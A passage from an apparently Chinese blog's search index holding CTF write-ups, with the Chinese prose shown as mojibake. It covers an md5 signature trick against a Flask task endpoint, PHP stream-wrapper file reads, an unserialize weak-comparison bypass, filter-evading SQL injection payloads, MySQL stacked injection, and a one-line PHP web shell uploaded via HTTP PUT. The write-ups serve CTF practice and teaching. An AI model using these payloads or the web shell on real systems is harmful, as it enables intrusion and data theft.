class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<br></code></pre></td></tr></table></figure><p>åœ¨<code>/De1ta</code>è·¯å¾„ä¸‹ï¼Œparamè¦ç»è¿‡waf()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">param</span>):<br>    check = param.strip().lower()<br><br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><p>paramå‚æ•°ä¸­ä¸èƒ½å«æœ‰gopherå’Œfile</p><p>æ¥ç€çœ‹åˆ°Taskç±»çš„Exec()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec</span>(<span class="hljs-params">self</span>):<br>       result = &#123;&#125;<br>       result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>       <span class="hljs-keyword">if</span> (self.checkSign()):<br>           <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>               tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)<br>               resp = scan(self.param)<br>               <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                   result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>               <span class="hljs-keyword">else</span>:<br>                   <span class="hljs-built_in">print</span>(resp)<br>                   tmpfile.write(resp)<br>                   tmpfile.close()<br>               result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>           <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>               f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>               result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>               result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br>           <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>               result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>       <span class="hljs-keyword">else</span>:<br>           result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>           result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>       <span class="hljs-keyword">return</span> result<br></code></pre></td></tr></table></figure><p>é¦–å…ˆè¦é€šè¿‡checkSign()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkSign</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><p>è°ƒç”¨äº†getSign(),è·Ÿè¿›å»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br></code></pre></td></tr></table></figure><p>secert_key + param + actionçš„md5è¦ç­‰äºä¼ è¿›å»çš„sign</p><p>action å¿…é¡»è¦å«æœ‰ <code>scanå’Œread</code></p><p>å«æœ‰scan åˆ™å¯ä»¥è¯»å‡ºparamæ–‡ä»¶ä¸­çš„å†…å®¹ç„¶åå†™è¿›ä¸´æ—¶æ–‡ä»¶ä¸­ï¼Œå› æ­¤paramä¼ å‚flag.txt</p><p>å«æœ‰readåˆ™å¯ä»¥æ‰“å¼€ä¸´æ—¶æ–‡ä»¶å¹¶å°†æ–‡ä»¶å†…å®¹è¯»å–å‡ºæ¥è¿”å›</p><p>åœ¨<code>/geneSign</code>è·¯å¾„ä¸‹çš„geneSign()å‡½æ•°å¯ä»¥è‡ªåŠ¨åˆ©ç”¨å¯†é’¥äº§ç”Ÿç­¾å</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geneSign</span>():<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br></code></pre></td></tr></table></figure><p>å› æ­¤åœ¨/genesignè·¯å¾„ä¸‹ä¼ å‚<code>?param=flag.txtread</code></p><p>å¾—åˆ°ç­¾å<code>3cc2121e7470ced190ff9c4d8be57d1b</code></p><p>,è¿™æ ·ä¸€æ¥å¾—åˆ°secert_keyflag.txtreadscançš„md5,</p><p>å›åˆ°/De1taè·¯å¾„ä¸‹ï¼ŒTaskç±»ä¸­ï¼Œ</p><p>actionä¼ å‚readscan</p><h3 id="å‚è€ƒèµ„æ–™"><a class="markdownIt-Anchor" href="#å‚è€ƒèµ„æ–™"></a> <em>å‚è€ƒèµ„æ–™</em></h3><p><em><a href="https://ctf-wiki.org/web/ssrf/?h=ssrf">https://ctf-wiki.org/web/ssrf/?h=ssrf</a></em></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTFwp</title>
    <link href="/2023/01/04/NSSCTFwp/"/>
    <url>/2023/01/04/NSSCTFwp/</url>
    
    <content type="html"><![CDATA[<h3 id="swpuctf-2021-æ–°ç”Ÿèµ›pseudoprotocols"><a class="markdownIt-Anchor" href="#swpuctf-2021-æ–°ç”Ÿèµ›pseudoprotocols"></a> [SWPUCTF 2021 æ–°ç”Ÿèµ›]PseudoProtocols</h3><p>æœ‰å…³PHPä¼ªåè®®ç®€å•è®°ä¸€ä¸‹</p><p>ä¸Šæ¥ç»™äº†ä¸€ä¸ªæç¤º</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">hint</span> <span class="hljs-keyword">is</span> hear Can you find out the <span class="hljs-keyword">hint</span>.php?<br></code></pre></td></tr></table></figure><p>å†çœ‹åœ°å€æ æœ‰å‚æ•°wllm</p><p>ç›´æ¥æƒ³åˆ°ä¼ªåè®®è¯»æ–‡ä»¶</p><p><code>php://filter/read=convert.base64-encode/resource=hint.php</code></p><p>base64è§£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//go to /test2222222222222.php</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è®¿é—®/test2222222222222.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;max_execution_time&quot;</span>, <span class="hljs-string">&quot;180&quot;</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$a</span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;r&#x27;</span>)) === <span class="hljs-string">&#x27;I want flag&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success\n&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä»£ç å®¡è®¡ï¼Œç›´æ¥php://input  å†post ä¸€ä¸ªI want flag æå®š</p><img src="/2023/01/04/NSSCTFwp/1.png" class=""><h3 id="hubuctf-2022-æ–°ç”Ÿèµ›checkin"><a class="markdownIt-Anchor" href="#hubuctf-2022-æ–°ç”Ÿèµ›checkin"></a> [HUBUCTF 2022 æ–°ç”Ÿèµ›]checkin</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$username</span>  = <span class="hljs-string">&quot;this_is_secret&quot;</span>; <br><span class="hljs-variable">$password</span>  = <span class="hljs-string">&quot;this_is_not_known_to_you&quot;</span>; <br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<span class="hljs-comment">//here I changed those two </span><br><span class="hljs-variable">$info</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;info&#x27;</span>])? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;info&#x27;</span>]: <span class="hljs-string">&quot;&quot;</span> ;<br><span class="hljs-variable">$data_unserialize</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$info</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$data_unserialize</span>[<span class="hljs-string">&#x27;username&#x27;</span>]==<span class="hljs-variable">$username</span>&amp;&amp;<span class="hljs-variable">$data_unserialize</span>[<span class="hljs-string">&#x27;password&#x27;</span>]==<span class="hljs-variable">$password</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;username or password error!&quot;</span>;<br><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>usernameå’Œpasswordéƒ½ä¼šè¢«ä¿®æ”¹æˆä¸çŸ¥é“çš„å€¼ï¼Œæ‰€ä»¥ä¸å¯èƒ½ç»™ä»–ä»¬èµ‹ä¸ŠçœŸå®çš„å€¼</p><p>è¿™é‡Œç”¨<code>==</code>æ˜¯å¼±æ¯”è¾ƒ</p><p>å¹¶ä¸”ç”¨äº†ååºåˆ—åŒ–</p><p>å› æ­¤ï¼Œæ„é€ infoå¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$info</span>=<span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;username&#x27;</span>=&gt;<span class="hljs-literal">true</span>,<br>    <span class="hljs-string">&#x27;password&#x27;</span>=&gt;<span class="hljs-literal">true</span><br>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$info</span>));<br><span class="hljs-comment">#a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å› ä¸ºä¸Šé¢ç”¨çš„æ˜¯é”®åè®¿é—®ï¼Œæ‰€ä»¥è¿™é‡Œè¦ç”¨æ•°ç»„</p><p>ç®€å•ä»‹ç»å¼±ç±»å‹æ¯”è¾ƒ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin&quot;</span>==<span class="hljs-number">0</span>);  <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;1admin&quot;</span>==<span class="hljs-number">1</span>); <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin1&quot;</span>==<span class="hljs-number">1</span>) <span class="hljs-comment">//false</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin1&quot;</span>==<span class="hljs-number">0</span>) <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;a&quot;</span>==<span class="hljs-literal">true</span>)  <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;a&quot;</span>==<span class="hljs-literal">false</span>)  <span class="hljs-comment">//false</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;0e123456&quot;</span>==<span class="hljs-string">&quot;0e4456789&quot;</span>); <span class="hljs-comment">//true </span><br><span class="hljs-meta">?&gt;</span>  <br><br></code></pre></td></tr></table></figure><p><code>NSSCTF&#123;881620fb-c01a-4eda-bbfa-baef4a333f9e&#125;</code></p><h3 id="swpuctf-2021-æ–°ç”Ÿèµ›sql"><a class="markdownIt-Anchor" href="#swpuctf-2021-æ–°ç”Ÿèµ›sql"></a> [SWPUCTF 2021 æ–°ç”Ÿèµ›]sql</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mysql">è¿‡æ»¤æ³¨é‡Šç¬¦ï¼Œç”¨%23æ›¿ä»£<br>è¿‡æ»¤ç©ºæ ¼ï¼Œç”¨/**/æ›¿ä»£<br>?wllm=1&#x27;/**/order/**/by/**/3%23   #3åˆ—<br>?wllm=0&#x27;/**/union/**/select/**/1,2,database()%23   #test_db<br>è¿‡æ»¤ç­‰å·,ç”¨likeæ›¿ä»£<br>?wllm=0&#x27;/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()%23 #LTLT_flag,users<br>?wllm=0&#x27;/**/union/**/select/**/1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/&#x27;LTLT_flag&#x27;%23  #id,flag<br>?wllm=0&#x27;/**/union/**/select/**/1,2,group_concat(flag)/**/from/**/LTLT_flag%23   #NSSCTF&#123;b0c390d7-ca62<br>group_concatåªå›æ˜¾20ä¸ªå­—ç¬¦ï¼Œä½¿ç”¨right,REVERSE,substrè¢«è¿‡æ»¤ï¼Œä½¿ç”¨midæ›¿ä»£<br>?wllm=0&#x27;/**/union/**/select/**/1,2,mid(group_concat(flag),21,20)/**/from/**/LTLT_flag%23 #-4071-9468-bb0808163<br>?wllm=0&#x27;/**/union/**/select/**/1,2,mid(group_concat(flag),41,20)/**/from/**/LTLT_flag%23  #493&#125;<br></code></pre></td></tr></table></figure><p><code>NSSCTF&#123;b0c390d7-ca62-4071-9468-bb0808163493&#125;</code></p><h3 id="å¼ºç½‘æ¯-2019éšä¾¿æ³¨"><a class="markdownIt-Anchor" href="#å¼ºç½‘æ¯-2019éšä¾¿æ³¨"></a> [å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h3><p>è¿™é“æ˜¯mysqlå †å æ³¨å…¥</p><p>payloadå¦‚ä¸‹</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;;show tables;&#x27;å¾—åˆ°ä¸¤ä¸ªè¡¨ï¼š<span class="hljs-number">1919810931114514</span> words<br><span class="hljs-attribute">1</span>&#x27;;show columns from `<span class="hljs-number">1919810931114514</span>`;&#x27;å¾—åˆ°å­—æ®µåä¸ºflag<br><span class="hljs-attribute">1</span>&#x27;;handler `<span class="hljs-number">1919810931114514</span>` open;handler `<span class="hljs-number">1919810931114514</span>` read first;&#x27;è¯»å‡ºflag:NSSCTF&#123;<span class="hljs-number">2</span>cc5ca69-<span class="hljs-number">9</span>cec-<span class="hljs-number">4</span>a31-<span class="hljs-number">8</span>cb4-ee8748c8b51f&#125;<br></code></pre></td></tr></table></figure><h3 id="nssround1-basicbasic_check"><a class="markdownIt-Anchor" href="#nssround1-basicbasic_check"></a> [NSSRound#1 Basic]basic_check</h3><p>çœ‹åˆ°æ—¶æœ‰å…³HTTPï¼ŒæŸ¥çœ‹è¯·æ±‚å¤´éƒ½æ²¡çœ‹åˆ°ä»€ä¹ˆï¼Œæ‰«æä¹Ÿæ²¡æœ‰ä»€ä¹ˆæç¤º</p><p>ç”¨curlå‘½ä»¤æ‰«ä¸€ä¸‹</p><img src="/2023/01/04/NSSCTFwp/5.jpg" class=""><p>ç°æœ‰è¯·æ±‚æ–¹æ³•å¯ä»¥ç”¨PUTï¼Œç›´æ¥å†™å…¥æœ¨é©¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><img src="/2023/01/04/NSSCTFwp/6.png" class=""><p>è®¿é—®1.phpï¼Œä¼ å‚</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">ls</span> /</span><br>?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">cat</span> /flag</span><br><span class="hljs-comment">#NSSCTF&#123;01dfc03a-f0f6-419d-a992-32dd79ea301d&#125;</span><br></code></pre></td></tr></table></figure><h3 id="swpu-2019ç¥å¥‡çš„äºŒç»´ç "><a class="markdownIt-Anchor" href="#swpu-2019ç¥å¥‡çš„äºŒç»´ç "></a> [SWPU 2019]ç¥å¥‡çš„äºŒç»´ç </h3><p>é™„ä»¶æ˜¯ä¸€å¼ äºŒç»´ç </p><img src="/2023/01/04/NSSCTFwp/MISC-%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81-BitcoinPay.png" class=""><p>æ‰«æåswpuctf{flag_is_not_here}æ˜¯å‡çš„flag</p><p>æ”¾åˆ°è™šæ‹Ÿæœºbinwalkä¸€ä¸‹</p><img src="/2023/01/04/NSSCTFwp/binwalk.png" class=""><p>å‘ç°æœ‰å¾ˆå¤šå‹ç¼©åŒ…</p><p><code>binwalk -e MISC-ç¥å¥‡çš„äºŒç»´ç -BitcoinPay.png</code>åˆ†è§£å‡ºæ¥</p><p>é‡Œé¢æœ‰ä¸€ä¸ªflag.docæ˜¯ä¸€å †base64ç¼–ç </p><p>é€šè¿‡20æ¬¡base64è§£ç </p><p>å¾—åˆ°<code>comEON_YOuAreSOSoS0great</code>,è¿™æ˜¯æ‰“å¼€18394.raré‡Œé¢éŸ³é¢‘çš„å¯†ç </p><p>éŸ³é¢‘æ‰“å¼€åæ˜¯ä¸€æ®µè«æ–¯å¯†ç </p><p>ç”¨Auæ‰“å¼€ï¼Œæ‰‹åŠ¨è§£ç </p><img src="/2023/01/04/NSSCTFwp/morse.png" class=""><p>é•¿çš„ä¸º<code>-</code>ï¼ŒçŸ­çš„ä¸º<code>.</code>ï¼Œç©ºçš„ç”¨<code>/</code>åˆ†éš”</p><p>å¾—åˆ°<code>--/---/.-./..././../.../...-/./.-./-.--/...-/./.-./-.--/./.-/.../-.--/</code></p><p>åœ¨çº¿è§£ç å¾—åˆ°<code>MORSEISVERYVERYEASY</code>,ç”¨Python<code>&quot;MORSEISVERYVERYEASY&quot;.lower()</code>è½¬å°å†™</p><p><code>NSSCTF&#123;morseisveryveryeasy&#125;</code></p><h3 id="swpu-2020å¥—å¨ƒ"><a class="markdownIt-Anchor" href="#swpu-2020å¥—å¨ƒ"></a> [SWPU 2020]å¥—å¨ƒ</h3><p>é™„ä»¶ä¸‹ä¸‹æ¥ï¼Œå¾—åˆ°æ‰“ä¸å¼€çš„swpu.xlsxå’ŒRC4data.txt</p><p>Officeæ–‡ä»¶çš„æœ¬è´¨éƒ½æ˜¯ä¸€ä¸ªzipå‹ç¼©åŒ…</p><p>æ”¹åç¼€ä¸ºzip,æ‰“å¼€swpu.zip</p><p>åˆå¾—åˆ°ä¸¤ä¸ª.xlsxæ–‡ä»¶ï¼šRC4key.xlsx,esayrc4.xlsx</p><p>éƒ½æ”¹ä¸ºzipï¼Œå‘ç°åªæœ‰RC4key.zipå¯ä»¥æ‰“å¼€ï¼Œesayrc4.zipæ‰“ä¸å¼€</p><p>RC4key.zipæ‰“å¼€ä¸ºä¸€ä¸ªåŠ å¯†çš„RC4key.txt</p><p>å°†esayrc4.xlsxæ”¾åˆ°WinHexé‡Œé¢åœ¨æœ€ä¸‹é¢å‘ç°å¯†ç <code>password:6e4c834d77cba03af41e1562a5bce84e</code>,</p><p>è§£å‹RC4key.zipå¾—åˆ°<code>ABCDEFGHIJKLMNOPQRSTUVWXYZ</code>,</p><p>ç»“åˆRC4data.txt åœ¨çº¿RC4è§£å¯†å¾—åˆ°ef1a73d40977a49b99b871980f355757</p><p><code>NSSCTF&#123;ef1a73d40977a49b99b871980f355757&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF,WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
